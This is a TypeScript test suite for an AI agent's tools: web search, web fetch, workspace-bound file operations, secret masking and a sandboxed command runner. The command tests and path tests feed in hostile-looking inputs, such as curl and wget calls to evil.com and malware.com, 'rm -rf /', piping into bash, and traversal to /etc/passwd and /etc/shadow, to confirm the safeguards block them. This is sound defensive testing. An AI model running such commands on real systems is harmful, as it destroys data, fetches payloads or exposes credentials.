import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { writeFile, readFile, unlink, mkdir, rm } from 'node:fs/promises';

// Web search
import { executeWebSearch } from '../src/tools/web-search-impl.js';

// Web fetch
import { executeWebFetch } from '../src/tools/web-fetch-impl.js';
import { UrlAllowlist } from '../src/safety/url-allowlist.js';

// File ops
import {
  validatePath,
  executeReadFile,
  executeWriteFile,
  executeEditFile,
} from '../src/tools/file-ops-impl.js';
import { SecretVault } from '../src/safety/secret-vault.js';

// Exec
import { executeCommand, resetSandboxState } from '../src/tools/exec-impl.js';
import { ActionClassifier } from '../src/safety/action-classifier.js';
import { defaultConfig } from '../src/config/default-config.js';

// Tool events
import { toolEvents, type ToolEvent } from '../src/tools/tool-events.js';

const testDir = join(tmpdir(), 'pawnbutler-tools-test-' + Date.now());

beforeEach(async () => {
  await mkdir(testDir, { recursive: true });
});

afterEach(async () => {
  try { await rm(testDir, { recursive: true, force: true }); } catch { /* ignore */ }
});

// -------------------------------------------------------
// Tool Events Tests
// -------------------------------------------------------
describe('ToolEvents', () => {
  it('should emit start events', () => {
    const events: ToolEvent[] = [];
    const handler = (e: ToolEvent) => events.push(e);
    toolEvents.on('tool:start', handler);

    toolEvents.emitStart('test_tool', { key: 'value' });

    expect(events).toHaveLength(1);
    expect(events[0].toolName).toBe('test_tool');
    expect(events[0].phase).toBe('start');
    expect(events[0].params).toEqual({ key: 'value' });

    toolEvents.off('tool:start', handler);
  });

  it('should emit complete events with duration', () => {
    const events: ToolEvent[] = [];
    const handler = (e: ToolEvent) => events.push(e);
    toolEvents.on('tool:complete', handler);

    toolEvents.emitComplete('test_tool', { result: 'ok' }, 150);

    expect(events).toHaveLength(1);
    expect(events[0].phase).toBe('complete');
    expect(events[0].durationMs).toBe(150);

    toolEvents.off('tool:complete', handler);
  });

  it('should emit error events', () => {
    const events: ToolEvent[] = [];
    const handler = (e: ToolEvent) => events.push(e);
    toolEvents.on('tool:error', handler);

    toolEvents.emitError('test_tool', 'something broke', 50);

    expect(events).toHaveLength(1);
    expect(events[0].phase).toBe('error');
    expect(events[0].error).toBe('something broke');
    expect(events[0].durationMs).toBe(50);

    toolEvents.off('tool:error', handler);
  });

  it('should emit on tool:event channel for all phases', () => {
    const events: ToolEvent[] = [];
    const handler = (e: ToolEvent) => events.push(e);
    toolEvents.on('tool:event', handler);

    toolEvents.emitStart('t', {});
    toolEvents.emitComplete('t', {}, 0);
    toolEvents.emitError('t', 'err', 0);

    expect(events).toHaveLength(3);
    expect(events.map((e) => e.phase)).toEqual(['start', 'complete', 'error']);

    toolEvents.off('tool:event', handler);
  });
});

// -------------------------------------------------------
// Web Search Tests (mocked fetch)
// -------------------------------------------------------
describe('Web Search Implementation', () => {
  const originalFetch = globalThis.fetch;

  afterEach(() => {
    globalThis.fetch = originalFetch;
    delete process.env.BRAVE_API_KEY;
  });

  it('should use Brave API when BRAVE_API_KEY is set', async () => {
    process.env.BRAVE_API_KEY = 'test-key-123';

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      json: async () => ({
        web: {
          results: [
            { title: 'Result 1', url: 'https://example.com/1', description: 'Snippet 1' },
            { title: 'Result 2', url: 'https://example.com/2', description: 'Snippet 2' },
          ],
        },
      }),
    }) as unknown as typeof fetch;

    const result = await executeWebSearch('test query', 5);
    expect(result.source).toBe('brave');
    expect(result.results).toHaveLength(2);
    expect(result.results[0].title).toBe('Result 1');
    expect(result.results[0].url).toBe('https://example.com/1');
    expect(result.results[0].snippet).toBe('Snippet 1');
    expect(result.query).toBe('test query');

    // Verify Brave API was called with correct headers
    expect(globalThis.fetch).toHaveBeenCalledTimes(1);
    const callArgs = (globalThis.fetch as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs[0]).toContain('api.search.brave.com');
    expect(callArgs[1].headers['X-Subscription-Token']).toBe('test-key-123');
  });

  it('should fall back to DuckDuckGo when no API key', async () => {
    delete process.env.BRAVE_API_KEY;

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => `
        <div class="result">
          <a class="result__a" href="https://example.com/page1">Page One</a>
          <a class="result__snippet">This is snippet one</a>
        </div>
      `,
    }) as unknown as typeof fetch;

    const result = await executeWebSearch('test', 3);
    expect(result.source).toBe('duckduckgo');
    expect(result.query).toBe('test');
  });

  it('should handle Brave API errors', async () => {
    process.env.BRAVE_API_KEY = 'test-key';

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: false,
      status: 429,
      statusText: 'Too Many Requests',
    }) as unknown as typeof fetch;

    await expect(executeWebSearch('test')).rejects.toThrow('Brave Search API error: 429');
  });

  it('should handle empty results', async () => {
    process.env.BRAVE_API_KEY = 'test-key';

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      json: async () => ({ web: { results: [] } }),
    }) as unknown as typeof fetch;

    const result = await executeWebSearch('empty query');
    expect(result.results).toHaveLength(0);
    expect(result.totalResults).toBe(0);
  });

  it('should respect count parameter', async () => {
    process.env.BRAVE_API_KEY = 'test-key';

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      json: async () => ({
        web: {
          results: [
            { title: 'R1', url: 'https://e.com/1', description: 'S1' },
            { title: 'R2', url: 'https://e.com/2', description: 'S2' },
            { title: 'R3', url: 'https://e.com/3', description: 'S3' },
          ],
        },
      }),
    }) as unknown as typeof fetch;

    const result = await executeWebSearch('test', 2);
    expect(result.results).toHaveLength(2);
  });

  it('should emit tool events on success', async () => {
    process.env.BRAVE_API_KEY = 'test-key';
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      json: async () => ({ web: { results: [] } }),
    }) as unknown as typeof fetch;

    const events: ToolEvent[] = [];
    const handler = (e: ToolEvent) => events.push(e);
    toolEvents.on('tool:event', handler);

    await executeWebSearch('test');

    toolEvents.off('tool:event', handler);
    expect(events.some((e) => e.phase === 'start' && e.toolName === 'web_search')).toBe(true);
    expect(events.some((e) => e.phase === 'complete' && e.toolName === 'web_search')).toBe(true);
  });
});

// -------------------------------------------------------
// Web Fetch Tests (mocked fetch)
// -------------------------------------------------------
describe('Web Fetch Implementation', () => {
  const originalFetch = globalThis.fetch;

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  function mockFetchHtml(html: string, status = 200) {
    const body = new ReadableStream({
      start(controller) {
        controller.enqueue(new TextEncoder().encode(html));
        controller.close();
      },
    });

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: status >= 200 && status < 300,
      status,
      statusText: status === 200 ? 'OK' : 'Error',
      headers: new Headers({ 'content-type': 'text/html; charset=utf-8' }),
      body,
    }) as unknown as typeof fetch;
  }

  it('should fetch and parse HTML', async () => {
    mockFetchHtml(`
      <html>
        <head><title>Test Page</title></head>
        <body>
          <article>Hello World, this is the main content.</article>
        </body>
      </html>
    `);

    const result = await executeWebFetch('https://example.com/page');
    expect(result.url).toBe('https://example.com/page');
    expect(result.title).toBe('Test Page');
    expect(result.text).toContain('Hello World');
    expect(result.truncated).toBe(false);
  });

  it('should extract article content preferentially', async () => {
    mockFetchHtml(`
      <html>
        <head><title>Blog</title></head>
        <body>
          <nav>Navigation stuff</nav>
          <article>This is the good content.</article>
          <footer>Footer junk</footer>
        </body>
      </html>
    `);

    const result = await executeWebFetch('https://example.com');
    // nav and footer should be removed; article content should remain
    expect(result.text).toContain('good content');
    expect(result.text).not.toContain('Navigation stuff');
    expect(result.text).not.toContain('Footer junk');
  });

  it('should enforce URL allowlist', async () => {
    const allowlist = new UrlAllowlist({ allow: ['example.com'] });

    await expect(
      executeWebFetch('https://evil-site.xyz/page', allowlist),
    ).rejects.toThrow('URL blocked');
  });

  it('should handle HTTP errors', async () => {
    mockFetchHtml('', 404);

    await expect(
      executeWebFetch('https://example.com/missing'),
    ).rejects.toThrow('HTTP 404');
  });

  it('should handle JSON content', async () => {
    const jsonBody = JSON.stringify({ key: 'value', data: [1, 2, 3] });
    const body = new ReadableStream({
      start(controller) {
        controller.enqueue(new TextEncoder().encode(jsonBody));
        controller.close();
      },
    });

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      statusText: 'OK',
      headers: new Headers({ 'content-type': 'application/json' }),
      body,
    }) as unknown as typeof fetch;

    const result = await executeWebFetch('https://api.example.com/data');
    expect(result.text).toContain('"key":"value"');
  });

  it('should emit tool events on success', async () => {
    mockFetchHtml('<html><body>test</body></html>');

    const events: ToolEvent[] = [];
    const handler = (e: ToolEvent) => events.push(e);
    toolEvents.on('tool:event', handler);

    await executeWebFetch('https://example.com');

    toolEvents.off('tool:event', handler);
    expect(events.some((e) => e.phase === 'start' && e.toolName === 'web_fetch')).toBe(true);
    expect(events.some((e) => e.phase === 'complete' && e.toolName === 'web_fetch')).toBe(true);
  });

  it('should emit tool events on error', async () => {
    const allowlist = new UrlAllowlist({ allow: ['example.com'] });

    const events: ToolEvent[] = [];
    const handler = (e: ToolEvent) => events.push(e);
    toolEvents.on('tool:event', handler);

    try {
      await executeWebFetch('https://evil.xyz', allowlist);
    } catch { /* expected */ }

    toolEvents.off('tool:event', handler);
    expect(events.some((e) => e.phase === 'error' && e.toolName === 'web_fetch')).toBe(true);
  });
});

// -------------------------------------------------------
// File Operations - Path Validation
// -------------------------------------------------------
describe('File Ops - Path Validation', () => {
  it('should allow valid paths within workspace', () => {
    const result = validatePath('src/main.ts', '/home/user/project');
    expect(result.valid).toBe(true);
    expect(result.resolved).toBe('/home/user/project/src/main.ts');
  });

  it('should allow absolute paths within workspace', () => {
    const result = validatePath('/home/user/project/src/main.ts', '/home/user/project');
    expect(result.valid).toBe(true);
  });

  it('should block path traversal with ../', () => {
    const result = validatePath('../../../etc/passwd', '/home/user/project');
    expect(result.valid).toBe(false);
    expect(result.error).toContain('traversal');
  });

  it('should block paths outside workspace', () => {
    const result = validatePath('/etc/passwd', '/home/user/project');
    expect(result.valid).toBe(false);
    expect(result.error).toContain('outside workspace');
  });

  it('should block embedded .. in path', () => {
    const result = validatePath('src/../../etc/shadow', '/home/user/project');
    expect(result.valid).toBe(false);
    expect(result.error).toContain('traversal');
  });

  it('should allow nested paths', () => {
    const result = validatePath('src/utils/helper.ts', '/home/user/project');
    expect(result.valid).toBe(true);
    expect(result.resolved).toBe('/home/user/project/src/utils/helper.ts');
  });

  it('should block symlink-like absolute path outside workspace', () => {
    const result = validatePath('/tmp/evil.txt', '/home/user/project');
    expect(result.valid).toBe(false);
    expect(result.error).toContain('outside workspace');
  });

  it('should block root path', () => {
    const result = validatePath('/', '/home/user/project');
    expect(result.valid).toBe(false);
  });
});

// -------------------------------------------------------
// File Operations - Read
// -------------------------------------------------------
describe('File Ops - Read', () => {
  it('should read a file', async () => {
    const filePath = join(testDir, 'read-test.txt');
    await writeFile(filePath, 'Hello World', 'utf-8');

    const result = await executeReadFile(filePath, testDir);
    expect(result.content).toBe('Hello World');
    expect(result.size).toBe(11);
  });

  it('should reject path traversal', async () => {
    await expect(
      executeReadFile('../../../etc/passwd', testDir),
    ).rejects.toThrow('traversal');
  });

  it('should reject nonexistent files', async () => {
    await expect(
      executeReadFile(join(testDir, 'nonexistent.txt'), testDir),
    ).rejects.toThrow();
  });

  it('should emit tool events', async () => {
    const filePath = join(testDir, 'event-test.txt');
    await writeFile(filePath, 'data', 'utf-8');

    const events: ToolEvent[] = [];
    const handler = (e: ToolEvent) => events.push(e);
    toolEvents.on('tool:event', handler);

    await executeReadFile(filePath, testDir);

    toolEvents.off('tool:event', handler);
    expect(events.some((e) => e.phase === 'start' && e.toolName === 'read_file')).toBe(true);
    expect(events.some((e) => e.phase === 'complete' && e.toolName === 'read_file')).toBe(true);
  });
});

// -------------------------------------------------------
// File Operations - Write
// -------------------------------------------------------
describe('File Ops - Write', () => {
  it('should write a file', async () => {
    const filePath = join(testDir, 'write-test.txt');

    const result = await executeWriteFile(filePath, 'Written content', undefined, testDir);
    expect(result.written).toBe(true);
    expect(result.size).toBe(15);

    const content = await readFile(filePath, 'utf-8');
    expect(content).toBe('Written content');
  });

  it('should create directories as needed', async () => {
    const filePath = join(testDir, 'sub', 'dir', 'deep.txt');

    const result = await executeWriteFile(filePath, 'deep content', undefined, testDir);
    expect(result.written).toBe(true);

    const content = await readFile(filePath, 'utf-8');
    expect(content).toBe('deep content');
  });

  it('should mask secrets when vault is provided', async () => {
    const vault = new SecretVault({ enabled: true, storePath: '/tmp/v' });
    vault.store('api_key', 'sk-secret-key-12345');

    const filePath = join(testDir, 'secret-test.txt');
    const result = await executeWriteFile(
      filePath,
      'API key is sk-secret-key-12345 here',
      vault,
      testDir,
    );

    expect(result.secretsMasked).toBe(true);
    const content = await readFile(filePath, 'utf-8');
    expect(content).toContain('***');
    expect(content).not.toContain('sk-secret-key-12345');
  });

  it('should reject path traversal', async () => {
    await expect(
      executeWriteFile('../../../etc/evil', 'bad', undefined, testDir),
    ).rejects.toThrow('traversal');
  });
});

// -------------------------------------------------------
// File Operations - Edit
// -------------------------------------------------------
describe('File Ops - Edit', () => {
  it('should edit a file by replacing text', async () => {
    const filePath = join(testDir, 'edit-test.txt');
    await writeFile(filePath, 'Hello World\nFoo Bar\n', 'utf-8');

    const result = await executeEditFile(
      filePath,
      [{ old_string: 'Foo Bar', new_string: 'Baz Qux' }],
      testDir,
    );

    expect(result.edited).toBe(true);
    expect(result.changesApplied).toBe(1);

    const content = await readFile(filePath, 'utf-8');
    expect(content).toContain('Baz Qux');
    expect(content).not.toContain('Foo Bar');
  });

  it('should apply multiple edits', async () => {
    const filePath = join(testDir, 'multi-edit.txt');
    await writeFile(filePath, 'aaa bbb ccc', 'utf-8');

    const result = await executeEditFile(
      filePath,
      [
        { old_string: 'aaa', new_string: 'AAA' },
        { old_string: 'ccc', new_string: 'CCC' },
      ],
      testDir,
    );

    expect(result.changesApplied).toBe(2);

    const content = await readFile(filePath, 'utf-8');
    expect(content).toBe('AAA bbb CCC');
  });

  it('should report 0 changes when nothing matches', async () => {
    const filePath = join(testDir, 'no-match.txt');
    await writeFile(filePath, 'unchanged', 'utf-8');

    const result = await executeEditFile(
      filePath,
      [{ old_string: 'nonexistent', new_string: 'replaced' }],
      testDir,
    );

    expect(result.edited).toBe(false);
    expect(result.changesApplied).toBe(0);
  });

  it('should reject path traversal', async () => {
    await expect(
      executeEditFile('../../../etc/passwd', [], testDir),
    ).rejects.toThrow('traversal');
  });
});

// -------------------------------------------------------
// Exec Implementation
// -------------------------------------------------------
describe('Exec Implementation', () => {
  const classifier = new ActionClassifier(defaultConfig.safety);

  beforeEach(() => {
    resetSandboxState();
  });

  it('should block forbidden commands via classifier', async () => {
    const result = await executeCommand('curl http://evil.com', classifier, {
      allowUnsandboxed: true,
    });

    expect(result.exitCode).toBe(126);
    expect(result.stderr).toContain('blocked by ActionClassifier');
  });

  it('should block rm -rf', async () => {
    const result = await executeCommand('rm -rf /', classifier, {
      allowUnsandboxed: true,
    });

    expect(result.exitCode).toBe(126);
    expect(result.stderr).toContain('blocked');
  });

  it('should block wget', async () => {
    const result = await executeCommand('wget http://malware.com/payload', classifier, {
      allowUnsandboxed: true,
    });

    expect(result.exitCode).toBe(126);
    expect(result.stderr).toContain('blocked');
  });

  it('should block sudo', async () => {
    const result = await executeCommand('sudo rm -rf /', classifier, {
      allowUnsandboxed: true,
    });

    expect(result.exitCode).toBe(126);
  });

  it('should block pipe to shell', async () => {
    const result = await executeCommand('something | bash', classifier, {
      allowUnsandboxed: true,
    });

    expect(result.exitCode).toBe(126);
  });

  it('should execute safe commands when unsandboxed allowed', async () => {
    const result = await executeCommand('echo hello', classifier, {
      allowUnsandboxed: true,
    });

    expect(result.exitCode).toBe(0);
    expect(result.stdout.trim()).toBe('hello');
    expect(result.sandboxed).toBe(false);
  });

  it('should capture stderr', async () => {
    const result = await executeCommand('echo error >&2', classifier, {
      allowUnsandboxed: true,
    });

    expect(result.stderr.trim()).toBe('error');
  });

  it('should respect timeout', async () => {
    const result = await executeCommand('sleep 10', classifier, {
      allowUnsandboxed: true,
      timeout: 500,
    });

    expect(result.exitCode).toBe(124);
    expect(result.stderr).toContain('timed out');
  });

  it('should block when sandbox not available and unsandboxed not allowed', async () => {
    const result = await executeCommand('echo hello', classifier, {
      allowUnsandboxed: false,
    });

    expect(result.exitCode).toBe(-1);
    expect(result.stderr).toContain('not available');
  });

  it('should include durationMs', async () => {
    const result = await executeCommand('echo test', classifier, {
      allowUnsandboxed: true,
    });

    expect(result.durationMs).toBeGreaterThanOrEqual(0);
  });

  it('should emit tool events', async () => {
    const events: ToolEvent[] = [];
    const handler = (e: ToolEvent) => events.push(e);
    toolEvents.on('tool:event', handler);

    await executeCommand('echo hi', classifier, { allowUnsandboxed: true });

    toolEvents.off('tool:event', handler);
    expect(events.some((e) => e.phase === 'start' && e.toolName === 'exec_command')).toBe(true);
    expect(events.some((e) => e.toolName === 'exec_command' && (e.phase === 'complete' || e.phase === 'error'))).toBe(true);
  });

  it('should emit unsandboxed warning when allowUnsandboxed is true', async () => {
    const events: ToolEvent[] = [];
    const handler = (e: ToolEvent) => events.push(e);
    toolEvents.on('tool:start', handler);

    await executeCommand('echo test', classifier, { allowUnsandboxed: true });

    toolEvents.off('tool:start', handler);
    const unsandboxedWarnings = events.filter(
      (e) => e.toolName === 'exec_command:unsandboxed_warning'
    );
    expect(unsandboxedWarnings.length).toBeGreaterThanOrEqual(1);
    expect(unsandboxedWarnings[0].params).toHaveProperty('warning');
  });

  it('should not emit unsandboxed warning when allowUnsandboxed is false', async () => {
    const events: ToolEvent[] = [];
    const handler = (e: ToolEvent) => events.push(e);
    toolEvents.on('tool:start', handler);

    await executeCommand('echo test', classifier, { allowUnsandboxed: false });

    toolEvents.off('tool:start', handler);
    const unsandboxedWarnings = events.filter(
      (e) => e.toolName === 'exec_command:unsandboxed_warning'
    );
    expect(unsandboxedWarnings).toHaveLength(0);
  });
});

// -------------------------------------------------------
// Integration: Builtin Tools wired to implementations
// -------------------------------------------------------
describe('Builtin Tools Integration', () => {
  it('webSearchTool.execute should call implementation', async () => {
    const { webSearchTool } = await import('../src/tools/builtin-tools.js');

    // Mock fetch for this test
    const originalFetch = globalThis.fetch;
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => '<div></div>',
    }) as unknown as typeof fetch;

    try {
      const result = await webSearchTool.execute({ query: 'test' }) as { source: string };
      // Should not return stub message
      expect(result).not.toHaveProperty('message', 'Web search not yet implemented');
      expect(result.source).toBeDefined();
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('readFileTool.execute should read a real file', async () => {
    const { readFileTool } = await import('../src/tools/builtin-tools.js');

    const filePath = join(testDir, 'builtin-read.txt');
    await writeFile(filePath, 'builtin test', 'utf-8');

    const result = await readFileTool.execute({ path: filePath, workspaceRoot: testDir }) as { content: string };
    expect(result.content).toBe('builtin test');
  });

  it('writeFileTool.execute should write a real file', async () => {
    const { writeFileTool } = await import('../src/tools/builtin-tools.js');

    const filePath = join(testDir, 'builtin-write.txt');

    const result = await writeFileTool.execute({
      path: filePath,
      content: 'written via tool',
      workspaceRoot: testDir,
    }) as { written: boolean };
    expect(result.written).toBe(true);

    const content = await readFile(filePath, 'utf-8');
    expect(content).toBe('written via tool');
  });

  it('editFileTool.execute should edit a real file', async () => {
    const { editFileTool } = await import('../src/tools/builtin-tools.js');

    const filePath = join(testDir, 'builtin-edit.txt');
    await writeFile(filePath, 'original text', 'utf-8');

    const result = await editFileTool.execute({
      path: filePath,
      edits: [{ old_string: 'original', new_string: 'modified' }],
      workspaceRoot: testDir,
    }) as { edited: boolean; changesApplied: number };
    expect(result.edited).toBe(true);
    expect(result.changesApplied).toBe(1);

    const content = await readFile(filePath, 'utf-8');
    expect(content).toBe('modified text');
  });

  it('execCommandTool.execute should block forbidden commands', async () => {
    const { execCommandTool } = await import('../src/tools/builtin-tools.js');

    const result = await execCommandTool.execute({ command: 'curl http://evil.com' }) as {
      exitCode: number;
      stderr: string;
    };
    expect(result.exitCode).toBe(126);
    expect(result.stderr).toContain('blocked');
  });
});
